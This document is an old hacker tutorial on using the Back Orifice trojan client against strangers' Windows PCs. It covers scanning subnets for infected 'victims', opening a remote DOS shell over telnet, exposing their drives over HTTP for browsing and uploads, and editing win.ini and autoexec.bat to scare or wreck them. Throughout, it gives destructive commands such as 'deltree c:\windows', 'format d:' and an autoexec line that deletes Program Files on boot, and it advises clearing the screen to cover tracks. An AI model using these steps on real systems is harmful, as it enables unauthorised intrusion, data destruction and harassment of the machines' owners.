1. Finding a victim
2. Telneting a hard drive
3. HTTP Enabling
4. Fun with win.ini and autoexec.bat



1. Finding a victim

Load up bogui.exe
In the target host:port box, enter an ip subnet to scan for i.e 
194.168.60.*
always include the wildcard, as this tells bogui to scan
Click Send, and wait, if you find a victim, something like this will 
show:

*** Beginning ping sweep of 194.168.70.*
---------- Packet received from host 194.168.70.140 port 31337 --------
  !PONG!1.20!DEFAULT!
------------------------- End of Data -------------------
*** Site found: 194.168.70.140

and now the fun begins....

2. Telneting a hard drive

Load up bogui.exe and boclient.exe
Find a victim and remember the full ip
In the boclient, type in:
host <ip address>
Then type
appadd command.com 23
you should get some text come up, saying you got a response etc etc
Load up telnet, and connect to the ip address thru port 23
If this is succesful, you should get a DOS session start thru telnet

Remember: you cant run any external programs thru the telnet session, 
for example the command
edit autoexec.bat
will not work
however, you can use the commands included in the command.com, such as

attrib -r -h system.dat
deltree c:\windows
format d:

use your imagination :)

3. HTTP Enabling

Load up bogui.exe and find a victim
Enter the full ip address into the target host box
Select http enable from the command list
In the box on the left that says Port, enter a port number, this can be
anything Click send, you should get a response saying http has been 
enabled on <port> 
Load up your web browser, i recommend using Netscape....
Enter the ip and port like this:
http://<ip address>:<port>
If it has worked the victims hard drives and cd-roms should be listed 
like an ftp site Click on C:\ for example, and it will list all files 
and directories, at the bottom of the page there will be a box for 
uploading files....

4. Fun with win.ini and autoexec.bat

Once you have your BO victim, its far more fun to fiddle with their 
system files and give em a scare than to totally destroy their hd(s)
Great fun can be had with the win.ini file, look for lines like this:

SHELL=EXPLORER.EXE
and change to:
SHELL=PROGMAN.EXE

to give that Windows 3.1 flavour.....

Or how about changing their desktop?
Make your own background, say fucked.bmp, upload to their hd and look 
for this line:

Wallpaper=tiles.bmp
becomes:
Wallpaper=fucked.bmp

When they restart, your wallpaper will be on their desktop :)

The win.ini is fairly self-explanatory, look for lines like these, and 
use your imagination:

iCountry=44
NullPort=None
sLongDate=dd MMMM yyyy
sShortDate=dd/MM/yy
bmp=C:\Progra~1\Access~1\mspaint.exe ^.bmp
ZIP=C:\PROGRA~1\WINZIP\winzip32.exe ^.ZIP

The Autoexec.bat requires some knowledge of DOS, but just as much fun 
can be had....

For example, the prompt command...
The prompt command is a little feature built into DOS that enables you 
to change the appearence of the DOS prompt simply by typing prompt 
<new prompt> the prompt uses a simple code, the default is this:

prompt $p$g
which gives

C:\>

however, type in prompt this computer has been fucked and their prompt
will be:

this computer has been fucked

there are plenty of things that can be added on as well:

prompt this$_computer$_has$_been$_fucked
will give a prompt like this:
this
computer 
has
been
fucked

the $_ command makes the prompt move onto the next line

another little feature of DOS is the ctrl+ commands, so typing 

prompt ctrl+A (which will appear as prompt ^A)
gives a prompt of a little smiley face...

fiddle about with the ctrl + command to see what else their is, but 
the most annoying of these is
prompt ctrl+G
ctrl+g makes the internal pc speaker beep, so adding the line:

prompt WARNING! MEMORY ALLOCATION ERROR!$_CMOS RESETING TO 
DEFAULT^G^G^G^G^G^G^G^G^G^G^G^G^G^G^G^G^G^G^G^G^G

is gonna scare this shit out of your average pc user, who knows nothing
about DOS, hes gonna crap himself when he switches on his pc and it 
beeps at him 50 times, ive also heard that pasting that about 500 
times makes the pc lock up, and even if it doesnt, EVERYTIME you enter 
a command on the DOS prompt, its gonna beep, and the same goes for the 
ctrl+c (cancel last command), HIGHLY irritating

But use your imagination, and see what you can do, its a simple matter
to make the autoexec.bat attempt a hard drive format on boot up, 
remember, the autoexec.bat will execute a command like a DOS 
prompt, so adding things like:

deltree c:\"program files"\ /y

is gonna make sure somebody has a really bad day.....

p.s make use of the cls command to cover your tracks....
